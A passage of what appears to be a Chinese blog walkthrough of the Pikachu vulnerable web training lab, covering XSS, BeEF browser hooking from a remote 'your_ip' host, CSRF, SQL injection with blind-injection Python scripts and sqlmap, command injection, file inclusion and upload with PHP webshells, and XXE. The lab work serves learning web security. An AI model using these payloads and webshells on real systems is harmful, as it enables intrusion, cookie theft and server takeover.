onerror=&#39;alert(document.cookie)&#39;&gt;\n\n执行成功\nxss之htmlspecialchars人生之所有苦短,是因为你的xss学习的还不够好\n这题也是点击才能弹窗的xss,onerror函数已经不能用了,这时可以用onclick\nxss之href输出这里看了别人的payload,使用了一个JavaScript协议payload:javascript:alert(1),然后又参考了这位大佬的JavaScript协议\nxss之js输出先来经典payload看一下\n看一下源码会发现输入的东西进入了&lt;script&gt;标签,那我们直接alert就好了,先将’闭合然后把后边的注释一下&#39;;alert(document.cookie)//\n前置芝士JavaScript协议简介JavaScript通信协议是一个伪协议,用于指定url为JavaScript代码\n\n语法\njavascript:someScript\n\nsomeScript是一个或多个使用;分割的JavaScript语句.\n\n实例\n&lt;a href=&quot;javasript:alert(document.cookie)&quot;&gt;JavaScript link&lt;/a&gt;\n\n特点\n返回值会替换当前文档\n对于chrome浏览器来说,如果最后一条JavaScript语句的值为字符串(使用’’,””或`括起来的值),那么该字符串会替换当前文档的内容,作为新文档显示出来\n对于Firefox浏览器来说,如果最后一条浏览器的返回值不是undefined,那么就调用该返回值的toString()方法(如果toString()方法不存在就调用valueOf()方法)得到的结果作为新文档显示出来\n返回值为undefined的几种常见写法\njavascript:;javascript:undefined; //全局变量undefined的值可能被更改//void 将之后的内容当作表达式，然后对该表达式求值，并始终返回undefined，而不管全局变量 undefined 的值是否被改变// 以下写法等价javascript:void(0);javascript:void 0;\n\n用途\n任何使用url的地方都可以使用该通信协议\n在保留锚元素href属性的同时防止点击锚元素页内/外跳转\njavascript:;javascript:undefined;javascript:void(0);\n\n当作 bookmarklet 这里写了个小 Demo\n// 修改书签的 URL 为以下代码, 就可实现分屏功能javascript:&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;&#x27;+document.title+&#x27;&lt;/title&gt;&lt;/head&gt;&lt;body style=&quot;margin:0;&quot;&gt;&lt;iframe style=&quot;border:none;&quot; width=&quot;50%&quot; height=&quot;100%&quot; src=&#x27;+location.href+&#x27;&gt;&lt;/iframe&gt;&lt;iframe style=&quot;border:none;&quot; width=&quot;50%&quot; height=&quot;100%&quot; src=&#x27;+location.href+&#x27;&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;&#x27;;\n\n执行 JavaScript 代码 (可以执行xss)\n// 更改页面背景为绿色 (推荐为锚元素绑定事件来更改页面背景)&lt;a href=&quot;javascript:void(document.body.style.backgroundColor=&#x27;green&#x27;);&quot;&gt;// 打开新页面 (注意需返回 undefined, 否则在火狐浏览器会替换文档)&lt;a href=&quot;javascript:window.open(&#x27;about:blank&#x27;); void(0);&quot;&gt;\n\nbeef安装这里推荐一个比较好用的xss平台：beef, 这个可以搭在自己的vps上,我也是在自己服务器上起了个docker,这里简单放一下安装步骤\n首先没有docker的要先安装\ncurl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun\n\n然后我们search一下\ndocker search beef\n\n\n然后我们pull这个janes的\ndocker pull docker.io/janes/beef\n\n然后就可以run一下跑起来\ndocker run --rm -p 3000:3000 docker.io/janes/beef\n\n\n这里是没有任何回显的,但是已经跑起来了.不用怀疑,然后我们访问一下http://your_ip:3000/ui/panel登录一下,账号密码都是beef\n简介beef官方文档说了一堆p话,我是没看懂,这里抄一下这位大佬的\n\nbeef主要是往网页中插入一段名为hook.js的JavaScript脚本代码,如果浏览器访问有了hook.js(钩子)的页面,就会被hook(钩住),勾连的浏览器会执行初始代码返回一些信息,接着目标主机会每隔一段时间(默认为1s)就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行\nbeef服务器本质上就像一个web应用,被分为前后端.前端会轮询后端是否有新的数据需要更新,同时前端也可以向后端发送指示,beef持有者可以通过浏览器来登录beef的后端,来控制前端(用户的浏览器)\nbeef一般和xss漏洞结合使用,使目标主机执行带有js的文件,但只能控制一个页面\n\n使用经典payload&lt; script src=“http://your_ip/hook.js”&gt;&lt; /script &gt;\n\n这里有很多比较好玩的功能可以玩一玩这里还是参考那位大佬的\n\n模块命令的使用和模块的作用种类Broser：主要是针对浏览器的一些信息收集或攻击，其下的子选项卡Hooked Domain主要是获取HTTP属性值，比如cookie、表单值等，还可以做写简单的浏览器操作，比如替换href值，弹出警告框，重定向浏览器等。这个选项卡下的有些模块会根据受害者的浏览器来决定是否显示。主要是浏览器通用操作和其他基本信息检测。Chrome extensions：主要是针对谷歌浏览器扩展插件Debug：调试功能Exploits：漏洞利用，主要利用一些已公开的漏洞进行攻击测试Host：针对主机，比如检测主机的浏览器、系统信息、IP地址、安装软件等等IPEC：协议间通信。主要是用来连接、控制受害者浏览器的Metasploit：Beef可通过配置和metasploit平台联合，一旦有受害者出现，可通过信息收集确定是否存在漏洞，进一步方便metasploit攻击测试Misc：杂项。Network：网络扫描Persistence：维护受害者访问Phonegap：手机测试Social engineering：社会工程学攻击\n其中：绿色模块：可以执行且目标不可见红色模块：不适合当前目标橙色模块：可以执行但目标可见灰色模块：未在目标浏览器上测试过\n\nCSRF\nCSRF(跨站请求伪造)概述\nCross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。这里列举一个场景解释一下，希望能够帮助你理解。场景需求：小黑想要修改大白在购物网站tianxiewww.xx.com上填写的会员地址。先看下大白是如何修改自己的密码的：登录—修改会员信息，提交请求—修改成功。所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。\n但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？于是他自己跑到www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：【http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。\n为啥小黑的操作能够实现呢。有如下几个关键点：1.www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;—因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;—如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。—因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。—所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。\n因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：–对敏感信息的操作增加安全的token；–对敏感信息的操作增加安全的验证码；–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。\n如果你没有读太明白,不要犹豫,请再读一遍啦\n你可以通过“Cross-site request forgery”对应的测试栏目，来进一步的了解该漏洞。\n\nCSRF(get)比较简单,bp能完全解决,都不用自己写poc,burpsuite直接一键生成\n当然,get请求的甚至都不需要bp生成poc,直接改url即可,这里两种方法都说一下吧\n首先我们来抓个包,可以发现get传修改的参数,url里就是所修改的信息,我们copy一下,把内容改成我们想要的\n比方说这里我构造的是这个http://localhost/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=110&amp;add=nba+lakes&amp;email=110%40pikachu.com&amp;submit=submit\n然后我们把这个url发给好友kobe,并欺骗他访问一下\n\n可以看到,他的信息就被修改了\n第二种还是抓包然后通过bp生成csrf_poc\n\n这里呢右上角可以勾选自动提交的,就是kobe一访问就会自动提交表单修改他的信息\n然后直接点浏览器测试,就会生成一个地址,这个地址就很有隐蔽性比如我这里是http://burpsuite/show/2/hd7yrgsw6qmo867vq7h667rlct97o7sh\n只要kobe访问它,他就又会被攻击了\n声明一下:这里是喜欢kobe才会用他的id,并不是想去攻击kobe,我想pikachu的作者应该也是喜欢kobe\nCSRF(post)这里很明显上述第一种方法是没法用的,但是第二种方法还是可以的,我们再重复一下上述操作很快就可以实现\nCSRF Token这题并没有找到利用方法,我们去翻一下它的源代码\n就是说我们在访问这个页面的时候就会自动生成一个新的token,那我们看一下这个token有什么规律呢\n//生成一个token,以当前微妙时间+一个5位的前缀function set_token()&#123;    if(isset($_SESSION[&#x27;token&#x27;]))&#123;       unset($_SESSION[&#x27;token&#x27;]);    &#125; //释放一个token并且生成一个    $_SESSION[&#x27;token&#x27;]=str_replace(&#x27;.&#x27;,&#x27;&#x27;,uniqid(mt_rand(10000,99999),true));&#125;//uniqid生成一个唯一ID  逗号后的true是more_entropy如果设置为TRUE，uniqid() 会在返回的字符串结尾增加额外的熵（使用combined linear congruential generator）。使得唯一ID更具唯一性。//mt_rand 随机数生成\n\n很明显这个token生成的没有任何规律,一直都在强调一个random\n这题token写的很不错,我没有找到可以利用的方法,在网上看了很多大佬的wp,大部分是解释说这个token可以防止csrf,也有大佬说是这个token可以像上边token防爆破?那题一样去爆破token,但是仔细想一下我们怎么才能提前猜到被攻击者的token,我们所进行的爆破都是攻击者主动去爆破的,我们不能让受害者去主动爆破token,但是受害者不爆破token,我们又猜不到他的token,所以只能放弃.我想唯一的方法大概就是给受害者发一个爆破token的脚本让他执行,那我们为什么不直接留后门🤣\nSql Inject(SQL注入)\n在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。一个严重的SQL注入漏洞，可能会直接导致一家公司破产！SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。\n在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；2.使用参数化（Parameterized Query 或 Parameterized Statement）；3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!\nSQL注入在网络上非常热门，也有很多技术专家写过非常详细的关于SQL注入漏洞的文章，这里就不在多写了。你可以通过“Sql Inject”对应的测试栏目，来进一步的了解该漏洞。\n\n数字型注入post型,抓一下包,直接开打,两个回显位\n1%20union%20select%201%2C(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%3Ddatabase())%20limit%200%2C1\n然后继续打1%20union%20select%201%2C(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name%3D&#39;users&#39;)%20limit%201%2C1\n现在开始查他的内容1%20union%20select%201%2C(select%20(group_concat(username%2Cpassword)))%20from%20users%20limit%201%2C1\n\n字符型注入加了个单引号而已,通过＃注释,继续上一题的payload这里不再浪费时间\n搜索型注入看见搜索框我们先来试一下xss\n然后就拿到了sql语句后边是%&#39;\n$query=&quot;select username,id,email from member where username like &#x27;%$name%&#x27;&quot;;\n\n源码也确实如此,还是老套路继续打\nxxx型注入$query=&quot;select id,email from member where username=(&#x27;$name&#x27;)&quot;;\n\n只是换了种闭合方式,换汤不换药\n“insert/update”注入\n登陆界面是无法注入,我们注册登录一下,这里的报错注入是可以用的&#39; or updatexml(1, concat(0x7e, database()), 0)#\n详情可参考这篇,这里不再重复\n“delete”注入这里删除发现没什么用,抓包一看原来注入点在这\n\n拿下\nhttp头注入\n跟上边insert注入一样,就是换了换地方payload: &#39; or updatexml(1,concat(0x7e,(select database())),1)or&#39;\n\n基于boolian的盲注首先用kobe&#39; and length(database())&gt;10 #判断出数据库名的长度\n经过几次尝试我们可以拿到数据库长度为7\n然后我们来个py脚本注一下\nimport requestsurl = &quot;http://localhost/vul/sqli/sqli_blind_b.php?name=&quot;users = &quot;abcdefghijklmnopqrstuvwxyz&quot;user = &quot;&quot;for i in range(8):    for u in users:        data = &quot;kobe&#x27;%20and%20if(substr(database()%2C&#123;&#125;%2C1)%20%3D%20&#x27;&#123;&#125;&#x27;%2C1%2C(select%20table_name%20from%20information_schema.tables))%23&amp;submit=%E6%9F%A5%E8%AF%A2&quot;.format(i,u)        # data=&#123;        # &quot;id&quot;:&quot;123&#x27; or substr(username,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; and id = 1#&quot;.format(i,u),        # &#125;        response = requests.get(url=url+data)        if &quot;your uid:3&quot; in response.text:            user += u            break    print(&quot;正在盲注第&#123;&#125;位&quot;.format(i))print(&quot;数据库名:&quot;+user)\n\n也可以用bp爆破,抓包,然后发到intruder,然后打上我们的payload,设一下这两个位置\n然后两个位置分别是数字和字母\n\n这里的1-7就刚好是我们数据库的库名顺序\n\n基于时间的盲注同bool盲注,我们先判断数据库长度kobe&#39; and if (length(database()) &gt; 5 ,sleep(5),null) #\nimport requestsimport timeimport osurl = &quot;http://localhost/vul/sqli/sqli_blind_b.php?name=&quot;users = &quot;abcdefghijklmnopqrstuvwxyz&quot;user = &quot;&quot;for i in range(8):    for u in users:        prox= &#123;            &#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;        &#125;        data = &quot;kobe&#x27;%20and%20if%20(substr(database()%2C&#123;&#125;%2C1)%20%3D%20&#x27;&#123;&#125;&#x27;%2Csleep(5)%2Cnull)%23&amp;submit=%E6%9F%A5%E8%AF%A2&quot;.format(i,u)        # data=&#123;        # &quot;id&quot;:&quot;123&#x27; or substr(username,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; and id = 1#&quot;.format(i,u),        # &#125;        # if &quot;your uid:3&quot; in response.text:        #     user += u        #     break        start_time = time.time()        response = requests.get(url=url + data,proxies=prox)        end_time = time.time()        t = end_time - start_time        if t &gt; 5:            user += u            break        print(data)    print(&quot;正在盲注第&#123;&#125;位&quot;.format(i)+format(u))    print(&quot;数据库名:&quot;+user)\n\n宽字节注入\n宽字节注入指的是MySQL数据库在使用宽字节(GBK)编码时,会认为两个字符是一个汉字(前一个ASCII码要大于128(比如%df),才到汉字的范围),而当我们输入单引号时,MySQL会调用转义函数,将单引号变为\\&#39;,其中的\\的十六进制是%5c,MySQL的GBK编码,会认为%df%5c是一个宽字节,也就是運从而使单引号闭合,进行注入.\n宽字节注入发生的位置就是php发送请求到MySQL时字符使用character_set_client设置值进行了一次编码,然后服务器会根据character_set_connenction把请求进行转码,从character_set_client转成character_set_connection,然后更新到数据库的时候,再转化成字段所对应的编码\n\n下述数据变化过程\n%df%27===&gt;(addslashes)====&gt;%df%5c%27====&gt;(GBK)====&gt;運’用户输入==&gt;过滤函数==&gt;代码层的$sql==&gt;mysql处理请求==&gt;mysql中的sql\n\npayload:name=kobe%20%df&#39;%20union%20select%201%2C(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%3Ddatabase())%20limit%200%2C1#&amp;submit=%E6%9F%A5%E8%AF%A2\n\nSQLmap我们再用sqlmap来一遍这个题目\n数字型注入这题是post型,我们先抓一个post的包\n\nPOST /vul/sqli/sqli_id.php HTTP/1.1Host: localhostContent-Length: 29Cache-Control: max-age=0sec-ch-ua: “Chromium”;v=”95”, “;Not A Brand”;v=”99”sec-ch-ua-mobile: ?0sec-ch-ua-platform: “Windows”Upgrade-Insecure-Requests: 1Origin: http://localhostContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://localhost/vul/sqli/sqli_id.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=70en5hdmaav0gib3anlocf62h7Connection: close\nid=1&amp;submit=%E6%9F%A5%E8%AF%A2\n\npython .\\sqlmap.py -r 1.txt -p id --dbs --batch\n字符型注入  python .\\sqlmap.py -u http://localhost/vul/sqli/sqli_str.php?name=1&quot;&amp;submit=查询&quot; --dbs --batch\n搜索型注入python .\\sqlmap.py -u http://localhost/vul/sqli/sqli_search.php?name=1&quot;&amp;submit=查询&quot; --dbs --batch\nxxx型注入同上,仍然可以打出\n python .\\sqlmap.py -u http://localhost/vul/sqli/sqli_x.php?name=1&quot;&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --dbs --batch\n“insert/update”注入 python .\\sqlmap.py -r 1.txt -p add --dbs --batch\n“delete”注入继续上述payload即可\nhttp头注入sqlmap --level 有五个等级,默认为1,2是cookie注入,3是UA注入,4是refere注入,5是host注入,这里我们使用level3\npython .\\sqlmap.py -r 1.txt -p User-Agent --level 3 --batch --dbs\n基于boolian的盲注RCE\nRCE(remote command/code execute)概述\nRCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。\n远程系统命令执行一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器\n现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的”收获”-_-\n远程代码执行同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。\n因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。\n你可以通过“RCE”对应的测试栏目，来进一步的了解该漏洞。\n\nexec “ping”这里应该是后端执行了shell ping命令,所以我们可以试一下|和`&amp;\n\n\n都可以执行成功就直接相当于拿到了服务器shell\nexec “eval”\n文件包含\nFile Inclusion(文件包含漏洞)概述\n文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：include(),include_once()require(),require_once()这些文件包含函数，这些函数在代码设计中被经常使用到。\n大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。2.远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。\n因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。\n你可以通过“File Inclusion”对应的测试栏目，来进一步的了解该漏洞。\n\n本地文件包含我们在目录下新建个txt,一会通过web页面读它\n然后我们直接在url里输入目录就可以\n远程文件包含这题没有把include写入源码里,需要我们在url里加上,当然也就给了我们一个远程利用的机会\n我们在远程服务器写一个可以写文件的php语句,然后写上一句话木马,像这样\n&lt;?php$myfile = fopen(&quot;1.php&quot;,&quot;w&quot;);$txt = &#x27;&lt;?php system($_POST[1]);?&gt;&#x27;;fwrite($myfile,$txt);fclose($myfile);?&gt;\n\n\npikachu成功被我们上传一句话木马\n\n上述方法很明显是非常繁杂的,那有没有什么简单粗暴的方法呢,当然有,上边1.txt是可以执行的,那我们把1.txt直接写成一句话木马不久可以了吗\n&lt;?php eval($_POST[1]);?&gt;\n\n\n不安全的文件下载\n不安全的文件下载概述\n文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。\n所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！\n你可以通过“Unsafe file download”对应的测试栏目，来进一步的了解该漏洞。\n\n不安全的文件下载这里可以类比于文件包含,我们可以下载到自己想要的任何虚拟机文件,这里我采用两种方法第一种是bp抓包改包\n第二种直接F12修改一下下载路径\n不安全的文件上传\n不安全的文件上传漏洞概述\n文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。\n所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：–验证文件类型、后缀名、大小;–验证文件的上传方式;–对文件进行一定复杂的重命名;–不要暴露文件上传后的路径;–等等…\n你可以通过“Unsafe file upload”对应的测试栏目，来进一步的了解该漏洞。\n\n客户端check这里可以简单理解成前端验证,然后JavaScript跳出来组织你上传,那我们只要把JavaScript禁用了就不会有任何东西阻止我们传马了,这里我在chrome store随便下载了一个\n然后就可以传上php一句话木马\n&lt;?php eval($_POST[&#x27;1&#x27;]);?&gt;\n\n\n蚁剑就可以连接了\n服务端check这里只是验证了Content-Type我们抓包改包就可以拿下还是利用上题的一句话木马就可以解决\n&lt;?php eval($_POST[&#x27;1&#x27;]);?&gt;\n\ngetimagesize()$type=array(&#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;);//指定类型$mime=array(&#x27;image/jpg&#x27;,&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;);$save_path=&#x27;uploads&#x27;.date(&#x27;/Y/m/d/&#x27;);//根据当天日期生成一个文件夹$upload=upload(&#x27;uploadfile&#x27;,&#x27;512000&#x27;,$type,$mime,$save_path);//调用函数\n\n这题会检查图片的特征,所以我们直接在一张图片里隐写一个一句话木马像这样\n\n我们上传这张图片,发现可以上传成功,并且图片里有一句话木马,但是我们这样读取是以图片的形式读取,我们的一句话木马是没法执行的这时候有个比较巧妙的办法就是利用前边的文件包含去读取我们现在文件上传的目录\n越权\n如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。\n一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。\n因此，在在权限管理中应该遵守：1.使用最小权限原则对用户进行赋权;2.使用合理（严格）的权限校验规则;3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;\n你可以通过“Over permission”对应的测试栏目，来进一步的了解该漏洞。\n\n水平越权这里我们先登录lucy的账号看一下\n这里我们直接将url地址改成kobe试一下\n显然, 我们成功访问到了kobe的所有信息\n垂直越权我们先登录admin看一下, 可以发现admin是可以添加用户的\n那我们用pikachu用户试一下能不能添加用户呢?\n\n创建成功!\n\n目录遍历\n目录遍历漏洞概述\n在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。\n看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。\n需要区分一下的是,如果你通过不带参数的url（比如：http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。 而并不归为目录遍历漏洞。\n\n任意文件读取,直接相对路径读到\n敏感信息泄露\n敏感信息泄露概述\n由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：—通过访问url下的目录，可以直接列出目录下的文件列表;—输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;\n类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。\n\n\n直接相对目录读一下\nPHP反序列化\n在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。\n序列化serialize()序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:\nclass S &#123;    public $test=&#x27;pikachu&#x27;;&#125;$s = new S(); //创建一个对象serialize($s); //把这个对象进行序列化//运行结果 O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;O: 代表object1: 代表对象名字长度为一个字符S: 对象名称1: 代表对象里有一个变量s: 数据类型4: 变量名称长度test: 变量名称s: 数据类型7: 变量值长度pikachu: 变量值\n\n反序列化unserialize()\n就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。\n$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);echo $u-&gt;test; //得到的结果为pikachu   \n\n序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题\n常见的几个魔法函数:__construct()当一个对象创建时被调用__dostruct() 当一个对象销毁时被调用__toString() 当一个对象被当作一个字符串使用__sleep() 在对象在被序列化之前运行__wakeup 将在序列化之后立即被调用漏洞举例:class S&#123;    var $test = &quot;pikachu&quot;;    function __destruct()&#123;        echo $this -&gt; test;    &#125;&#125;$s = $__GET[&#x27;test&#x27;];@$unser = unserialize($a)    //payload: O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;\n\n我们翻阅一下这题的源代码\n\n最终代码成功利用与否提现在前端,索性我们就效仿上边生成一串xss\n&lt;?phpclass S &#123;    public $test=&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;;&#125;$s = new S();echo serialize($s);?&gt;\n\n\nXXE\nXXE -“xml external entity injection”既”xml外部实体注入漏洞”。概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。\n具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。\n本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。\n\n我们首先使用\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe  &quot;Charmersix&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;\n\n发现在本地是有回显的, 这时候我们开始外部注入,试着访问一下我们电脑的win.ini文件(file协议只能绝对路径读取)\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM 